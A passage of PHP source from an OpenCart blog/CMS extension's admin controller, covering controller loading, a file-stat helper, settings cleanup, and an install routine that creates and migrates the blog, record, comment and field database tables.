			$file  = DIR_APPLICATION . 'controller/' . $cont . '.php';
            if (file_exists($file)) {
             	$this->cont_loading($cont, $file);
            } else {
				trigger_error('Error: Could not load controller ' . $cont . '!');
				exit();
			}
		}
	}
	private function cont_loading ($cont, $file)
	{
			$class = 'Controller' . preg_replace('/[^a-zA-Z0-9]/', '', $cont);
			include_once($file);
			$this->registry->set('controller_' . str_replace('/', '_', $cont), new $class($this->registry));
	}
/***************************************/

	public function control($cont)
	{
		$file = DIR_APPLICATION . 'controller/' . $cont . '.php';
		$class = 'Controller' . preg_replace('/[^a-zA-Z0-9]/', '', $cont);
		if (file_exists($file)) {
			include_once($file);
			$this->registry->set('controller_' . str_replace('/', '_', $cont), new $class($this->registry));
		} else {
			trigger_error('Error: Could not load controller ' . $cont . '!');
			exit();
		}
	}
/***************************************/

	private function alt_stat($file)
	{
		$s = false;
		clearstatcache();
		$ss = @stat($file);
		if (!$ss)
			return false;
		$ts = array(
			0140000 => 'ssocket',
			0120000 => 'llink',
			0100000 => '-file',
			0060000 => 'bblock',
			0040000 => 'ddir',
			0020000 => 'cchar',
			0010000 => 'pfifo'
		);
		$p = $ss['mode'];
		$t = decoct($ss['mode'] & 0170000);
		$str = (array_key_exists(octdec($t), $ts)) ? $ts[octdec($t)]{0} : 'u';
		$str .= (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-');
		$str .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
		$str .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-');
		$str .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
		$str .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-');
		$str .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
		$s = array(
			'perms' => array(
				'umask' => sprintf("%04o", @umask()),
				'human' => $str,
				'octal1' => sprintf("%o", ($ss['mode'] & 000777)),
				'octal2' => sprintf("0%o", 0777 & $p),
				'decimal' => sprintf("%04o", $p),
				'fileperms' => @fileperms($file),
				'mode1' => $p,
				'mode2' => $ss['mode']
			),
			'owner' => array(
				'fileowner' => $ss['uid'],
				'filegroup' => $ss['gid'],
				'owner' => (function_exists('posix_getpwuid')) ? @posix_getpwuid($ss['uid']) : '',
				'group' => (function_exists('posix_getgrgid')) ? @posix_getgrgid($ss['gid']) : ''
			),
			'file' => array(
				'filename' => $file,
				'realpath' => (@realpath($file) != $file) ? @realpath($file) : '',
				'dirname' => @dirname($file),
				'basename' => @basename($file)
			),
			'filetype' => array(
				'type' => substr($ts[octdec($t)], 1),
				'type_octal' => sprintf("%07o", octdec($t)),
				'is_file' => @is_file($file),
				'is_dir' => @is_dir($file),
				'is_link' => @is_link($file),
				'is_readable' => @is_readable($file),
				'is_writable' => @is_writable($file)
			),
			'device' => array(
				'device' => $ss['dev'],
				'device_number' => $ss['rdev'],
				'inode' => $ss['ino'],
				'link_count' => $ss['nlink'],
				'link_to' => ($s['type'] == 'link') ? @readlink($file) : ''
			),
			'size' => array(
				'size' => $ss['size'],
				'blocks' => $ss['blocks'],
				'block_size' => $ss['blksize']
			),
			'time' => array(
				'mtime' => $ss['mtime'],
				'atime' => $ss['atime'],
				'ctime' => $ss['ctime'],
				'accessed' => @date('Y M D H:i:s', $ss['atime']),
				'modified' => @date('Y M D H:i:s', $ss['mtime']),
				'created' => @date('Y M D H:i:s', $ss['ctime'])
			)
		);
		clearstatcache();
		return $s;
	}
/***************************************/
	public function deleteOldSetting()
	{
        $this->language->load('module/blog');

        if (!$this->validate()) {
	        $html = $this->language->get('error_permission');
	        $this->response->setOutput($html);
	        return;
        }

		$html = "<br>";
		$this->load->model('setting/setting');
		$ascp_settings = $this->model_setting_setting->getSetting('ascp_settings');
		$blog_module = $this->model_setting_setting->getSetting('blog_module');
		$ascp_widgets = $this->model_setting_setting->getSetting('ascp_widgets');
		$blog_old = $this->model_setting_setting->getSetting('blog');
		if (count($ascp_settings) == 0 || count($blog_module) == 0 || count($ascp_widgets) == 0) {
			$html .= $this->language->get('error_delete_old_settings');
		} else {

			$this->model_setting_setting->deleteSetting('blog');

			$html .= $this->language->get('ok_create_tables');
		}
		$this->cache->delete('blog');
		$this->cache->delete('record');
		$this->cache->delete('blog.module.view');
		$this->cache->delete('blogsrecord');
		$this->cache->delete('category');
		$this->cache->delete('product');
		$this->cache->delete('html');
		$this->language->load('catalog/blog');
		$this->response->setOutput($html);
	}
/***************************************/

	public function deleteAllSettings()
	{
        $this->language->load('module/blog');

        if (!$this->validate()) {
	        $html = $this->language->get('error_permission');
	        $this->response->setOutput($html);
	        return;
        }

		$html = "";
		$this->load->model('setting/setting');

       	$this->model_setting_setting->deleteSetting('ascp_admin');
       	$this->model_setting_setting->deleteSetting('ascp_settings');
       	$this->model_setting_setting->deleteSetting('ascp_comp_url');
       	$this->model_setting_setting->deleteSetting('ascp_settings_sitemap');
        $this->model_setting_setting->deleteSetting('ascp_version');
        $this->model_setting_setting->deleteSetting('ascp_version_model');
        $this->model_setting_setting->deleteSetting('ascp_ver');
        $this->model_setting_setting->deleteSetting('ascp_widgets');
        $this->model_setting_setting->deleteSetting('blog_module');

		$html .= $this->language->get('ok_delete_all_settings');

		$this->cache->delete('blog');
		$this->cache->delete('record');
		$this->cache->delete('blog.module.view');
		$this->cache->delete('blogsrecord');
		$this->cache->delete('category');
		$this->cache->delete('product');
		$this->cache->delete('html');
		$this->language->load('catalog/blog');
		$this->response->setOutput($html);
	}



	public function createTables()
	{
        if (!$this->validate()) {
	        return;
        }

        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);
         if (SCP_VERSION < 2) {
			$msql = "SELECT * FROM `" . DB_PREFIX . "setting` WHERE `group`='blogadmin'";
			$query = $this->db->query($msql);
			if (count($query->rows) > 0) {
				foreach ($query->rows as $row) {
                    $msql = "UPDATE `" . DB_PREFIX . "setting` SET `group`='ascp_admin', `key`='ascp_admin_".$row['key']."' WHERE `setting_id`='".$row['setting_id']."'";
					$this->db->query($msql);

				}
			}

			$msql = "SELECT * FROM `" . DB_PREFIX . "setting` WHERE `group`='blog_schemes'";
			$query = $this->db->query($msql);
			if (count($query->rows) > 0) {
				foreach ($query->rows as $row) {
                    $msql = "UPDATE `" . DB_PREFIX . "setting` SET `group`='blog_module', `key`='blog_module'  WHERE `setting_id`='".$row['setting_id']."'";
					$this->db->query($msql);

				}
			}

			$msql = "SELECT * FROM `" . DB_PREFIX . "setting` WHERE `group`='blog_widgets'";
			$query = $this->db->query($msql);
			if (count($query->rows) > 0) {
				foreach ($query->rows as $row) {
                    $msql = "UPDATE `" . DB_PREFIX . "setting` SET `group`='ascp_widgets', `key`='ascp_widgets' WHERE `setting_id`='".$row['setting_id']."'";
					$this->db->query($msql);

				}
			}

			$msql = "SELECT * FROM `" . DB_PREFIX . "setting` WHERE `group`='blog_options' AND `key`='generallist'";
			$query = $this->db->query($msql);
			if (count($query->rows) > 0) {
				foreach ($query->rows as $row) {
                    $msql = "UPDATE `" . DB_PREFIX . "setting` SET `group`='ascp_settings', `key`='ascp_settings' WHERE `setting_id`='".$row['setting_id']."'";
					$this->db->query($msql);

				}
			}

            $msql = "DELETE FROM `" . DB_PREFIX . "setting` WHERE `group`='blogversion'";
			$this->db->query($msql);
            $msql = "DELETE FROM `" . DB_PREFIX . "setting` WHERE `group`='blog_ver'";
			$this->db->query($msql);

			$msql = "DELETE FROM `" . DB_PREFIX . "setting` WHERE `group`='blog_options'";
			$this->db->query($msql);

         }

		$this->data['this'] = $this;
		$this->load->model('setting/setting');
		$this->language->load('module/blog');
		$this->data['blog_version'] = $this->language->get('blog_version');
        $this->data['blog_version_model'] = $this->language->get('blog_version_model');

		$this->model_setting_setting->editSetting('ascp_ver', Array('ascp_ver_date' => 0, 'ascp_ver_content' => 0 ));


		$setting_admin = Array(
			'ascp_admin_http_admin_path' => HTTP_SERVER,
			'ascp_admin_https_admin_path' => HTTPS_SERVER
		);
		$this->model_setting_setting->editSetting('ascp_admin', $setting_admin);

		$setting_version = Array(
			'ascp_version' => $this->data['blog_version']
		);
		$this->model_setting_setting->editSetting('ascp_version', $setting_version);

		$setting_version_model = Array(
			'ascp_version_model' => $this->data['blog_version_model']
		);
		$this->model_setting_setting->editSetting('ascp_version_model', $setting_version_model);

		$this->language->load('catalog/blog');

		$html = "";
		$html .= $this->remove_old_loader();
		$html .= $this->remove_new_loader();
		$html .= $this->install_new_loader();

		$this->load->model('localisation/language');
		$languages = $this->model_localisation_language->getLanguages();
		foreach ($languages as $language) {
			if ($this->config->get('config_language') == $language['code']) {
				$directory = $language['directory'];
			}
		}
		$file = DIR_LANGUAGE . $directory . '/common/footer.php';
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions(DIR_LANGUAGE . $directory . '/common/footer.php');
			$text = preg_replace("!<[\?]php [\$]loader(.*?)[\?]>!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('ok_777'). '<br>';
			} else {
				$html .= $file ."<br>".$this->language->get('access_777') . "<br>";
			}
		}



		$sql[0] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "blog` (
  `blog_id` int(11) NOT NULL AUTO_INCREMENT,
  `image` varchar(255) COLLATE utf8_general_ci DEFAULT NULL,
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `top` tinyint(1) NOT NULL,
  `column` int(3) NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`blog_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1;
";
		$sql[1] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "blog_description` (
  `blog_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `description` text COLLATE utf8_general_ci NOT NULL,
  `meta_description` varchar(255) COLLATE utf8_general_ci NOT NULL,
  `meta_keyword` varchar(255) COLLATE utf8_general_ci NOT NULL,
  PRIMARY KEY (`blog_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[2] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "blog_to_layout` (
  `blog_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`blog_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[3] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "blog_to_store` (
  `blog_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  PRIMARY KEY (`blog_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[4] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `author` varchar(64) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `text` text COLLATE utf8_general_ci NOT NULL,
  `rating` int(1) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`comment_id`),
  KEY `record_id` (`record_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$sql[5] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `image` varchar(255) COLLATE utf8_general_ci DEFAULT NULL,
  `sort_order` int(11) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `comment` text COLLATE utf8_general_ci NOT NULL,
  `comment_status` tinyint(1) NOT NULL,
  `comment_status_reg` tinyint(1) NOT NULL,
  `comment_status_now` tinyint(1) NOT NULL,
  `date_available` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_end` datetime NOT NULL DEFAULT '2033-03-03 00:00:00',
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `viewed` int(5) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$sql[6] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_attribute` (
  `record_id` int(11) NOT NULL,
  `attribute_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `text` text COLLATE utf8_general_ci NOT NULL,
  PRIMARY KEY (`record_id`,`attribute_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[7] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_description` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_general_ci NOT NULL,
  `description` text COLLATE utf8_general_ci NOT NULL,
  `meta_description` varchar(255) COLLATE utf8_general_ci NOT NULL,
  `meta_keyword` varchar(255) COLLATE utf8_general_ci NOT NULL,
  PRIMARY KEY (`record_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$sql[9] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_image` (
  `record_image_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `image` varchar(255) COLLATE utf8_general_ci DEFAULT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_image_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";

		$sql[12] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_related` (
  `record_id` int(11) NOT NULL,
  `related_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`related_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";

		$sql[15] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_tag` (
  `record_tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `tag` varchar(32) COLLATE utf8_general_ci NOT NULL,
  PRIMARY KEY (`record_tag_id`),
  KEY `record_id` (`record_id`),
  KEY `language_id` (`language_id`),
  KEY `tag` (`tag`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$sql[16] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_to_blog` (
  `record_id` int(11) NOT NULL,
  `blog_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`blog_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[17] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_to_download` (
  `record_id` int(11) NOT NULL,
  `download_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`download_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[18] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_to_layout` (
  `record_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[19] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_to_store` (
  `record_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[20] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "rate_comment` (
  `comment_id` int(11) unsigned NOT NULL,
  `customer_id` int(11) unsigned NOT NULL,
  `delta` float(9,3) DEFAULT '0.000',
  KEY `comment_id` (`comment_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8  COLLATE=utf8_general_ci;
";
		$sql[21] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "record_product_related` (
  `record_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
";
		$sql[22] = "CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "url_alias_blog` (
  `url_alias_id` int(11) NOT NULL AUTO_INCREMENT,
  `query` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`url_alias_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;";
		$sql[23] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "rate_review` (
  `review_id` int(11) unsigned NOT NULL,
  `customer_id` int(11) unsigned NOT NULL,
  `delta` float(9,3) DEFAULT '0.000',
  KEY `review_id` (`review_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8  COLLATE=utf8_general_ci;
";
		$sql[24] = "CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "agoo_signer` (
`id` INT( 11 ) NOT NULL ,
`pointer` varchar(128) COLLATE utf8_general_ci NOT NULL,
`customer_id` INT( 11 ) NOT NULL ,
`date` DATETIME NOT NULL ,
KEY ( `pointer` ),
KEY ( `id` ) ,
KEY( `customer_id` ),
KEY( `date` )
) ENGINE = MYISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$sql[25] = "CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "review_fields` (
					 `review_id` int(11) NOT NULL,
					  KEY `review_id` (`review_id`)
		) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;";

$sql[26] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "fields` (
  `field_id` int(11) NOT NULL AUTO_INCREMENT,
  `field_name` varchar(255) COLLATE utf8_general_ci NOT NULL,
  `field_image` varchar(255) COLLATE utf8_general_ci DEFAULT NULL,
  `field_type` varchar(255) COLLATE utf8_general_ci DEFAULT NULL,
  `field_must` tinyint(1) NOT NULL DEFAULT '0',
  `field_order` int(11) NOT NULL DEFAULT '0',
  `field_status` tinyint(1) NOT NULL DEFAULT '1',
  `field_public` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`field_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$sql[27] = "
CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "fields_description` (
  `field_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `field_description` text COLLATE utf8_general_ci NOT NULL,
  `field_error` text COLLATE utf8_general_ci NOT NULL,
  `field_value` text COLLATE utf8_general_ci NOT NULL,
  KEY (`field_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci AUTO_INCREMENT=1 ;
";
		$this->load->model('localisation/language');
		$languages = $this->model_localisation_language->getLanguages();
		foreach ($sql as $qsql) {
			$query = $this->db->query($qsql);
		}

		$not_found_id = $this->layout_module('error/not_found', $this->language->get('text_not_found'));
		$this->layout_module('record/blog',$this->language->get('text_layout_blog'));
		$this->layout_module('record/search',$this->language->get('text_layout_blog'));
		$this->layout_module('record/record',$this->language->get('text_layout_record'));

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review `cmswidget`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `cmswidget` INT(11) NOT NULL AFTER `status` ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "comment `cmswidget`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `cmswidget` INT(11) NOT NULL AFTER `status` ";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "review` `language_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `language_id` INT(11) NOT NULL DEFAULT '".$this->config->get('config_language_id')."' AFTER `status` ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "comment` `language_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `language_id` INT(11) NOT NULL DEFAULT '".$this->config->get('config_language_id')."' AFTER `status` ";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "customer `avatar`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "customer` ADD `avatar` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL AFTER `lastname`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "fields_description `field`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "fields_description` ADD `field` LONGTEXT CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL AFTER `field_value`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "fields `field_public`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "fields` ADD `field_public` tinyint(1) NOT NULL DEFAULT '1' AFTER `field_status`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "blog_description `meta_title`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "blog_description` ADD `meta_title` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `description`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "agoo_signer `email`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "agoo_signer` ADD `email` VARCHAR( 96 ) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL AFTER `customer_id`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "url_alias_blog `language_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "url_alias_blog` ADD `language_id` INT(11) NOT NULL DEFAULT '".$this->config->get('config_language_id')."' AFTER `keyword` ";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "blog_description `meta_h1`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "blog_description` ADD `meta_h1` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `description`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record_description `meta_title`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_description` ADD `meta_title` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `description`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record_description `meta_h1`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_description` ADD `meta_h1` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `description`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `date_available`");
		if ($r->num_rows > 0 && $r->row['Type'] == 'date') {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` CHANGE `date_available` `date_available` DATETIME NOT NULL DEFAULT '0000-00-00 00:00:00' ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record_related `record_id`");
		if ($r->num_rows != 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_related` CHANGE `record_id` `pointer_id` INT( 11 ) NOT NULL  ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record_related `pointer`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_related` ADD `pointer` VARCHAR( 128 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `related_id` ";
			$query = $this->db->query($msql);
			$msql = "UPDATE `" . DB_PREFIX . "record_related` SET `pointer` = 'record_id'";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "record_related`  WHERE Key_name ='PRIMARY'");
		if ($r->num_rows != 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_related`  DROP PRIMARY KEY ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "record_related`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_related`  ADD INDEX `pointer` ( `pointer_id` , `pointer` ) ";
			$query = $this->db->query($msql);
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_related`  ADD INDEX `related` ( `related_id` , `pointer` ) ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record_product_related `product_id`");
		if ($r->num_rows != 0) {
			$msql = "SELECT * FROM `" . DB_PREFIX . "record_product_related`";
			$query = $this->db->query($msql);
			if (count($query->rows) > 0) {
				foreach ($query->rows as $blog_id) {
					$msql = "SELECT * FROM `" . DB_PREFIX . "record_related` WHERE `pointer_id`='" . $blog_id['product_id'] . "' AND pointer='product_id'";
					$query_1 = $this->db->query($msql);
					if (count($query_1->rows) <= 0) {
						$this->db->query("DELETE FROM " . DB_PREFIX . "record_related WHERE pointer_id = '" . $blog_id['record_id'] . "' AND related_id = '" . $blog_id['product_id'] . "' AND pointer='product_id'");
						$this->db->query("DELETE FROM " . DB_PREFIX . "record_related WHERE pointer_id = '" . $blog_id['product_id'] . "' AND related_id = '" . $blog_id['record_id'] . "' AND pointer='product_id'");
						$this->db->query("INSERT INTO " . DB_PREFIX . "record_related SET pointer_id = '" . $blog_id['record_id'] . "', related_id = '" . $blog_id['product_id'] . "' , pointer='product_id'");
						$this->db->query("INSERT INTO " . DB_PREFIX . "record_related SET pointer_id = '" . $blog_id['product_id'] . "', related_id = '" . $blog_id['record_id'] . "' , pointer='product_id'");
					}
				}
				$msql = "DROP TABLE `" . DB_PREFIX . "record_product_related`";
				$query = $this->db->query($msql);
			}
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "setting `value`");
		if ($r->num_rows > 0 && $r->row['Type'] == 'text') {
			$msql = "ALTER TABLE `" . DB_PREFIX . "setting` CHANGE `value` `value` LONGTEXT CHARACTER SET utf8 COLLATE utf8_general_ci  NOT NULL ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review_fields `review_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields` ADD `review_id` INT( 11 )  NOT NULL ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review_fields `mark`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields` ADD `mark` VARCHAR( 255 ) CHARACTER SET ascii COLLATE ascii_bin NOT NULL AFTER `review_id`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review_fields `product_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields` ADD `product_id` INT( 11 ) NOT NULL FIRST";
			$query = $this->db->query($msql);
		}


		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "review_fields`  WHERE Key_name ='PRIMARY'");
		if ($r->num_rows != 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields`  DROP PRIMARY KEY ";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "review_fields` WHERE Key_name ='review_id'");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields`  ADD INDEX (`review_id`)";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "review_fields` WHERE Key_name ='product_id'");
		if ($r->num_rows == 0) {
